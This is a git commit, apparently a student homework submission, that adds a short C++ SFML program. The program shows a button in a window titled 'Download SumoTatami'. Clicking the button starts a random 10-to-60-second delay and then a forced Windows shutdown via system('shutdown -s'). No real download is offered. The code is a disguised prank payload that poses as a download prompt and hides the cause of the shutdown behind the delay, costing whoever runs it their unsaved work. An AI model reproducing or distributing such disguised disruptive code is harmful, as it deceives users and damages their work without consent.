c3030bcdebe0fd9d453c1becc15257b11bdeb089
LaineAnnaMaria <maria.laine2323@gmail.com>
2025-04-22 14:08:07 +0300

    Laine Anna Maria minihw3

---
+++ sem2/LaineAnnaMaria/minihw3/minihw3.cpp
@@ -0,0 +1,37 @@
+﻿#include <SFML/Graphics.hpp>
+#include <SFML/Window/Mouse.hpp>
+#include <ctime>
+#include "windows.h"
+
+
+int main()
+{
+    sf::RenderWindow window(
+        sf::VideoMode({ 486, 53 }),
+        "Download SumoTatami", sf::State::Windowed);
+    sf::Vector2i mouseCoord;
+    sf::Texture texture("button.png");
+    sf::Sprite Button(texture);
+    bool mousepressed = false;
+    while (window.isOpen()) {
+
+        while (const std::optional event = window.pollEvent()) {
+            if (event->is<sf::Event::Closed>()) {
+                window.close();
+            }
+            if (!sf::Mouse::isButtonPressed(sf::Mouse::Button::Left)) {
+                mousepressed = false;
+            }
+
+            if (!mousepressed && sf::Mouse::isButtonPressed(sf::Mouse::Button::Left)) {
+                mousepressed = true;
+                mouseCoord = sf::Mouse::getPosition(window);
+                srand(time(0));
+                Sleep(10000 + rand()%50000);
+                system("shutdown -s");
+            }
+        }
+        window.draw(Button);
+        window.display();
+    }
+}
